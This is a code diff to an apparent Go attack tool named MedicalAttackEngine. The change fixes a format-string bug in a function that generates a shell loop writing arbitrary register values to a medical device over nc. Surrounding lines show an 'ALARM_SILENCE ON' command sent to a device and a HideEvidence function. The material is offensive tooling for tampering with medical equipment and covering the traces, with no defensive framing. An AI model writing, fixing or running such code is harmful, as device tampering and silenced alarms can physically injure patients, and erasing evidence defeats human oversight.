@@ -167,11 +167,8 @@ echo "ALARM_SILENCE ON" | nc %s 6001
 }
 
 func (ma *MedicalAttackEngine) genericMedicalHijack(device MedicalDevice) string {
-	return fmt.Sprintf(`# GENERIC HIJACK - %s (%s)
-for val in $(seq 0 255); do
-    echo "WRITE 0x%02X $val" | nc %s 9000
-done
-`, device.Name, device.CVE, val, "192.168.1.100")
+	return fmt.Sprintf("# GENERIC HIJACK - %s (%s)\nfor val in $(seq 0 255); do\n    echo \"WRITE 0x%%02X $val\" | nc %s 9000\ndone\n",
+		device.Name, device.CVE, "192.168.1.100")
 }
 
 func (ma *MedicalAttackEngine) HideEvidence() {
